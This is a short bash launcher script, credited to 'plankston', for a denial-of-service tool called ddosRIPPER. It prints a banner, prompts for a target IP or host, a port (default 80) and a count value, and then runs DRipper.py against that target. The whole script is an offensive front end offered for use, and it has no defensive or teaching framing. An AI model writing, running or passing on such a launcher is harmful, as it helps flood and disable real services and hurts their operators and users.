clear;toilet -f standard -F gay ddosRIPPER
echo 'by plankston
' |lolcat
read -p "ip/host : " domain
echo "port default 80" |lolcat
read -p "port : " domain1
echo "quite defaul 135" |lolcat
read -p "quite : " domain2

python3 DRipper.py -s $domain $domain1 $domain2
